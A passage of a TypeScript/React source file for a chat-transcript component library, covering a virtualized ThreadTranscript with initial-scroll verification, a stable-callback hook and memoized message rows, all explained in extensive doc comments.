 * `display: block`, or virtual-core's own follow-up commit after this effect's own jump) changes
 * neither the row count nor the virtualizer identity, so a dependency-keyed effect would never
 * re-run for it.
 *
 * `getContainerHeight` is a THUNK, not a number, for the same reason: reading `offsetHeight` forces
 * a synchronous layout, and it is read at most ONCE per mount — only on the very first call
 * (`attempts === 0`) — never again while verifying or retrying, so a landed transcript still pays
 * nothing for the effect it keeps re-running (a streaming transcript commits on every chunk).
 * `isAtEnd` is cheaper (a plain property read, no forced reflow beyond what the browser already
 * tracks) and is exactly what the verification/retry loop above consults instead.
 */
export function applyInitialScroll(
  state: InitialScrollState,
  initialScroll: NonNullable<VirtualizeOptions['initialScroll']>,
  rowCount: number,
  getContainerHeight: () => number,
  scrollToEnd: () => void,
  isAtEnd: () => boolean,
): void {
  if (state.hasApplied) return

  // Already fired at least once this mount — verify it survived rather than re-deriving
  // `resolveInitialScrollAction` (row count / container height are irrelevant to "did the DOM
  // keep the scroll we already decided on").
  if (state.attempts > 0) {
    if (isAtEnd() || state.attempts >= MAX_INITIAL_SCROLL_ATTEMPTS) {
      state.hasApplied = true
      return
    }
    scrollToEnd()
    state.attempts += 1
    return
  }

  const action = resolveInitialScrollAction(initialScroll, rowCount, getContainerHeight())
  if (action === 'skip-retry') return
  if (action === 'skip-done') {
    state.hasApplied = true
    return
  }
  scrollToEnd()
  state.attempts += 1
}

/** Reads the transcript's own scroll container to answer "is it currently at (or within
 * `threshold`px of) the end" — the ground-truth check {@link applyInitialScroll} verifies its jump
 * against. Deliberately NOT `virtualizer.isAtEnd()`/`getScrollOffset()`: both are backed by
 * `this.scrollOffset`, the exact value that lags a real scroll until the next native `scroll`
 * event fires — using it here would make the verification vulnerable to the identical staleness
 * that causes the clobber in the first place. `scrollTop`/`scrollHeight`/`clientHeight` are plain
 * DOM properties with no such lag: `Element.scrollTo` with `'auto'` (this module's own behavior)
 * updates `scrollTop` synchronously, so a read immediately after — or, as here, on the next
 * commit — reflects reality. `null` (container not yet attached) reads as "not at end" rather than
 * throwing, matching every other guard in this file's tolerance for a not-yet-mounted ref. */
function isContainerAtEnd(container: HTMLDivElement | null, threshold: number): boolean {
  if (container === null) return false
  const distanceFromEnd = container.scrollHeight - container.clientHeight - container.scrollTop
  return distanceFromEnd <= threshold
}

/** Lazy-loaded real virtualizer. Resolves once, permanently, for the lifetime of this module
 * instance — identical caching behaviour to `../agent/stick-to-bottom.tsx`'s `LazyStickToBottom`. */
const LazyVirtualizedRows = lazy(() =>
  import('@tanstack/react-virtual')
    .then(({ useVirtualizer, measureElement: defaultMeasureElement }) => {
      function VirtualizedRowsInner({
        rows,
        height,
        overscan,
        estimateSize,
        initialScroll,
      }: VirtualizedTranscriptProps): JSX.Element {
        const parentRef = useRef<HTMLDivElement>(null)
        const initialScrollStateRef = useRef<InitialScrollState>({
          hasApplied: false,
          attempts: 0,
        })

        // Resolved research facts (virtual-core 3.17.1, carried by react-virtual 3.14.3):
        // `getItemKey` returning `message.id` (NOT the default index) so prepending/streaming
        // doesn't scramble anchoring; `anchorTo: 'end'` + `followOnAppend` for chat-scroll rhythm;
        // `useFlushSync: false` per the same React-19 opt-out `BasaltVirtualList` documents.
        const virtualizer = useVirtualizer({
          count: rows.length,
          getScrollElement: () => parentRef.current,
          estimateSize: () => estimateSize,
          overscan,
          getItemKey: (index) => rows[index]?.key ?? index,
          anchorTo: 'end',
          followOnAppend: true,
          scrollEndThreshold: DEFAULT_VIRTUALIZE_SCROLL_END_THRESHOLD,
          useFlushSync: false,
          // Guards against the hidden-ancestor cache-poisoning mechanism
          // `resolveGuardedMeasurement`'s doc and `virtualize.ts`'s composition rules describe —
          // NOT `enabled: false`, which virtual-core 3.17.1 wires to WIPE
          // `itemSizeCache`/`measurementsCache` entirely (`getMeasurements`'s `!enabled` branch)
          // rather than pause measurement, so toggling it off/on around a collapse would be
          // strictly worse than the bug it was meant to fix.
          measureElement: (element, entry, instance) =>
            resolveGuardedMeasurement(
              instance,
              element,
              defaultMeasureElement(element, entry, instance),
            ),
        })

        // The one-shot "open at the newest message" jump (`virtualize.ts`'s fourth composition
        // rule) — see `applyInitialScroll`'s doc for the guard mechanics, including why this effect
        // deliberately carries NO dependency array. Short version: this subtree can mount while
        // INVISIBLE (the lazy `import()` above settles asynchronously, so a `ThreadFeedRow`
        // collapsed during that window mounts it behind `display: none`), and the commit that makes
        // it visible again changes no dependency a keyed array could watch. That SAME dependency-
        // free cadence is also what lets this effect recover from virtual-core's own `_willUpdate`
        // clobbering the jump on the commit right after it lands (see `applyInitialScroll`'s doc) —
        // `state.hasApplied` only becomes permanent once `isContainerAtEnd` confirms it on a later
        // call, not the instant `scrollToEnd` is invoked. `parentRef.current.offsetHeight` (not
        // `getBoundingClientRect`) matches what virtual-core's own `getRect` reads for the scroll
        // container, so a hidden ancestor is treated as unmeasured in exactly the cases virtual-core
        // itself would also treat that way; it is passed as a thunk (like the `isContainerAtEnd`
        // read below) so nothing is forced once the jump has landed and been confirmed.
        useLayoutEffect(() => {
          applyInitialScroll(
            initialScrollStateRef.current,
            initialScroll,
            rows.length,
            () => parentRef.current?.offsetHeight ?? 0,
            () => virtualizer.scrollToEnd({ behavior: 'auto' }),
            () => isContainerAtEnd(parentRef.current, DEFAULT_VIRTUALIZE_SCROLL_END_THRESHOLD),
          )
        })

        return (
          // theme-allow raw-scroll-container — TanStack Virtual measures/scrolls this element (never nest in BasaltStickToBottom, see ./virtualize).
          <Box ref={parentRef} style={{ height, overflow: 'auto' }}>
            <Box style={{ height: virtualizer.getTotalSize(), position: 'relative' }}>
              {virtualizer.getVirtualItems().map((virtualItem) => {
                const row = rows[virtualItem.index]
                if (row === undefined) return null
                return (
                  <Box
                    key={row.key}
                    // Dynamic measurement of variable-height rows (messages vary a lot: a
                    // one-line reply vs. a long streamed answer with code fences) — both required
                    // together, per the resolved research facts.
                    ref={virtualizer.measureElement}
                    data-index={virtualItem.index}
                    style={{
                      position: 'absolute',
                      top: 0,
                      left: 0,
                      width: '100%',
                      transform: `translateY(${virtualItem.start}px)`,
                    }}
                  >
                    {row.node}
                  </Box>
                )
              })}
            </Box>
          </Box>
        )
      }
      return { default: VirtualizedRowsInner }
    })
    .catch(() => ({ default: NonVirtualizedRows })),
)

/**
 * Lightweight `Suspense` fallback for `VirtualizedTranscript` — shown only for the one tick the
 * dynamic `@tanstack/react-virtual` import takes to resolve. Deliberately NOT `NonVirtualizedRows`:
 * see that component's doc for why mounting every real row here would be a genuine (if one-time)
 * unmount/remount of the whole transcript. An empty, correctly-sized scroll pane avoids a layout
 * flash without paying that cost — it settles state before any row has meaningfully mounted.
 */
function VirtualizeSuspenseFallback({ height }: { readonly height: number | string }): JSX.Element {
  // theme-allow raw-scroll-container — placeholder owns its own scroll node, matching the real virtualizer's shape.
  return <Box style={{ height, overflow: 'auto' }} />
}

function VirtualizedTranscript(props: VirtualizedTranscriptProps): JSX.Element {
  return (
    <Suspense fallback={<VirtualizeSuspenseFallback height={props.height} />}>
      <LazyVirtualizedRows {...props} />
    </Suspense>
  )
}

// ── ThreadTranscript ──────────────────────────────────────────────────────────

const EMPTY_RENDERERS: PartRenderers = {}

type ThreadTranscriptBase = {
  /** Settled messages for the thread, oldest first. */
  readonly messages: readonly ChatMessage<TranscriptPart>[]
  /** The live (in-flight) assistant turn's parts, when a run is streaming for this thread. */
  readonly liveParts?: readonly TranscriptPart[]
  /** The live run's status — drives the in-progress indicator on the live block. */
  readonly liveStatus?: StreamStatus
  /** Consumer renderers keyed by part.type. Consulted BEFORE the built-in union. */
  readonly renderers?: PartRenderers
  /** Called for a part whose type is neither an AgentPart variant nor a registered key. Defaults
   * to a visible `UnknownPartChip` outside production, `null` in production — never throws. */
  readonly fallbackRenderer?: PartRenderer<ForeignPart>
  /** Per-message hover-row affordances (timestamp/copy/regenerate/custom actions). Unset fields
   * fall back to `DEFAULT_AFFORDANCES`. Never shown on the live/streaming message — see
   * `MessageBlockProps.affordances`. */
  readonly affordances?: MessageAffordances
  /** Suppresses the role label and surface chrome on a message whose predecessor shares its role
   * and landed within 5 minutes — the Slack rhythm.
   * @default true */
  readonly groupConsecutive?: boolean
}

export type ThreadTranscriptProps = ThreadTranscriptBase & VirtualizeProps

/**
 * Wraps a possibly-fresh-every-render EVENT HANDLER in a wrapper function whose IDENTITY never
 * changes across renders (while it is defined), always calling through to the LATEST version via a
 * ref — the same "mirror the latest value every render" idiom `use-agent-thread-runs.ts` uses for
 * `storeRef`/`transportRef`, applied to a callback instead of a value.
 *
 * This is what lets `resolvedAffordances` below key its memo on the handler's PRESENCE (defined vs
 * not) rather than on ITS reference — a consumer passing a fresh inline `onRegenerate={(id) => …}`
 * literal every render (the common case; see `MessageAffordances`'s own doc) no longer defeats
 * `resolvedAffordances`'s memo, and transitively `MessageBlock`'s `affordances`-by-reference
 * bail-out. Only a genuine defined-to-undefined (or back) transition changes the returned wrapper's
 * presence.
 *
 * ONLY EVER APPLY THIS TO AN EVENT HANDLER — never to a render prop. The trick works precisely
 * because the wrapper is invoked AFTER render (from a click), so freezing its identity costs
 * nothing: React re-reads the ref at call time. A render prop (`MessageAffordances.actions`, which
 * `MessageAffordanceRow` invokes DURING render to produce nodes) is the opposite case: its identity
 * is the only signal React has that its OUTPUT might differ, so freezing it makes every memo above
 * it bail out and the consumer's actions render permanently stale — a `pin`/`star` control wired to
 * consumer state would never update again for the transcript's whole lifetime. `actions` is
 * therefore deliberately keyed by reference in `resolvedAffordances`; a consumer that wants the
 * memo win there wraps its own `actions` in `useCallback`, which is a choice only the consumer can
 * make because only it knows what the closure reads.
 */
function useStableCallback<Args extends unknown[], R>(
  callback: ((...args: Args) => R) | undefined,
): ((...args: Args) => R) | undefined {
  const callbackRef = useRef(callback)
  callbackRef.current = callback
  // Deliberately empty deps: this is what keeps `stable`'s identity constant across renders. It
  // reads `callbackRef.current` at CALL time (not at creation time), so it always invokes whatever
  // the consumer most recently passed — never a closure captured at first mount.
  const stable = useMemo<(...args: Args) => R>(
    () =>
      (...args: Args) =>
        callbackRef.current?.(...args) as R,
    [],
  )
  return callback === undefined ? undefined : stable
}

/**
 * Renders a thread's settled messages, each role-labelled ("You" / "Assistant"). Each part
 * resolves in order: a registered `renderers[part.type]` first, then basalt's own `PartList` for
 * the built-in six, then `fallbackRenderer`. When `liveParts` is non-empty, an extra in-progress
 * assistant block is appended at the tail.
 *
 * Set `virtualize` (with a required `height`) to window a long thread over
 * `@tanstack/react-virtual` (an optional peer) instead of rendering every message. The virtualized
 * transcript owns its own fixed-height scroll container and must NOT be nested inside
 * `BasaltStickToBottom` — see `./virtualize`'s module doc. With the peer absent, `virtualize` still
 * renders (unwindowed, inside the same fixed-height pane) rather than throwing. A virtualized
 * transcript scrolls itself to the newest message once, on mount (`initialScroll: 'start'` opts
 * out) — see `./virtualize`'s fourth composition rule.
 *
 * @example
 * import { ThreadTranscript } from 'basalt-ui'
 * <ThreadTranscript messages={thread.messages} liveParts={liveParts} liveStatus={runStatus} />
 *
 * @example
 * // Windowed, for a long thread:
 * <ThreadTranscript messages={thread.messages} virtualize height={480} />
 */
export function ThreadTranscript(props: ThreadTranscriptProps): JSX.Element {
  const {
    messages,
    liveParts,
    liveStatus,
    renderers: renderersProp,
    fallbackRenderer = DEFAULT_FALLBACK_RENDERER,
    affordances: affordancesProp,
    groupConsecutive = true,
  } = props
  const virtualized = resolveVirtualize(props)

  // Mirrors PartList's own `useMemo` (part-list.tsx:290) — avoids rebuilding the renderer
  // lookup on every streaming re-render.
  const renderers = useMemo(() => renderersProp ?? EMPTY_RENDERERS, [renderersProp])

  const liveMessage = useMemo<ChatMessage<TranscriptPart> | null>(() => {
    if (liveParts === undefined || liveParts.length === 0) return null
    return { id: '__live__', role: 'assistant', parts: liveParts as TranscriptPart[], createdAt: 0 }
  }, [liveParts])

  const lastAssistantMessageId = useMemo(() => {
    for (let i = messages.length - 1; i >= 0; i -= 1) {
      const candidate = messages[i]
      if (candidate?.role === 'assistant') return candidate.id
    }
    return null
  }, [messages])

  // `onRegenerate` is an EVENT HANDLER, so it goes through `useStableCallback` before this memo
  // sees it — without that, a consumer's fresh inline `{ onRegenerate: (id) => … }` literal (the
  // common case) changes every render, so keying the deps array on the raw field defeated this memo
  // for exactly that case: `resolvedAffordances` (and transitively every `MessageBlock`'s
  // `affordances` reference-equality bail-out) recomputed every render regardless of the
  // timestamp/copy fields actually being stable. Keying on the STABLE wrapper's presence fixes
  // that; only a genuine defined-to-undefined transition on the underlying handler invalidates.
  //
  // `actions` is deliberately NOT given the same treatment: it is a RENDER prop (invoked during
  // render to produce nodes), so its reference is the only signal that its OUTPUT may have changed.
  // Stabilizing it froze every consumer action at its first-render output for the transcript's
  // whole lifetime. It is keyed by reference here, which means a fresh inline `actions` literal
  // legitimately re-renders the blocks — the correct trade, and one a consumer can opt out of with
  // its own `useCallback`. See `useStableCallback`'s doc.
  const stableOnRegenerate = useStableCallback(affordancesProp?.onRegenerate)
  const actions = affordancesProp?.actions

  const resolvedAffordances = useMemo<MessageAffordances>(
    () => ({
      timestamp: affordancesProp?.timestamp ?? DEFAULT_AFFORDANCES.timestamp,
      copy: affordancesProp?.copy ?? DEFAULT_AFFORDANCES.copy,
      // `exactOptionalPropertyTypes` forbids assigning a possibly-`undefined` value to an optional
      // property directly — spread each field in only when it is actually present, rather than
      // widening `MessageAffordances` itself to accept an explicit `undefined`.
      ...(stableOnRegenerate !== undefined && { onRegenerate: stableOnRegenerate }),
      ...(actions !== undefined && { actions }),
    }),
    [affordancesProp?.timestamp, affordancesProp?.copy, stableOnRegenerate, actions],
  )

  // Settled rows are memoized SEPARATELY from the live block: `liveMessage`/`liveStatus` change on
  // every streamed chunk (a fresh `liveParts` array produces a fresh `liveMessage` object each
  // time), so keeping them in the SAME memo as the settled rows recomputed every settled message's
  // JSX descriptor on every chunk — O(n) allocation per token on a long thread, and it handed
  // `useVirtualizer` a new `rows`/`count`/`getItemKey` identity every chunk too. Appending the live
  // row OUTSIDE this memo means a streamed chunk only ever re-allocates the one live row plus a
  // cheap wrapping array — the settled `MessageBlock` elements are the SAME object references
  // React saw last render, so it bails out of that whole subtree without even reaching each
  // `MessageBlock`'s memo comparator.
  const settledRows = useMemo<TranscriptRow[]>(() => {
    const out: TranscriptRow[] = []
    messages.forEach((message, index) => {
      out.push({
        key: message.id,
        node: (
          <MessageBlock
            message={message}
            renderers={renderers}
            fallbackRenderer={fallbackRenderer}
            grouped={groupConsecutive && isConsecutiveWithPredecessor(message, messages[index - 1])}
            isLastAssistant={message.id === lastAssistantMessageId}
            affordances={resolvedAffordances}
          />
        ),
      })
    })
    return out
  }, [
    messages,
    renderers,
    fallbackRenderer,
    groupConsecutive,
    lastAssistantMessageId,
    resolvedAffordances,
  ])

  const liveRow = useMemo<TranscriptRow | null>(() => {
    if (liveMessage === null) return null
    return {
      key: liveMessage.id,
      node: (
        <div aria-live="polite" aria-atomic="false" aria-relevant="additions">
          <MessageBlock
            message={liveMessage}
            streaming={liveStatus === 'streaming'}
            renderers={renderers}
            fallbackRenderer={fallbackRenderer}
          />
        </div>
      ),
    }
  }, [liveMessage, liveStatus, renderers, fallbackRenderer])

  const rows = useMemo<TranscriptRow[]>(
    () => (liveRow === null ? settledRows : [...settledRows, liveRow]),
    [settledRows, liveRow],
  )

  if (virtualized !== null) {
    return (
      <VirtualizedTranscript
        rows={rows}
        height={virtualized.height}
        overscan={virtualized.options.overscan ?? DEFAULT_VIRTUALIZE_OVERSCAN}
        estimateSize={virtualized.options.estimateSize ?? DEFAULT_VIRTUALIZE_ESTIMATE_SIZE}
        initialScroll={virtualized.options.initialScroll ?? DEFAULT_VIRTUALIZE_INITIAL_SCROLL}
      />
    )
  }

  return (
    <Stack gap="sm">
      {rows.map((row) => (
        <Fragment key={row.key}>{row.node}</Fragment>
      ))}
    </Stack>
  )
}
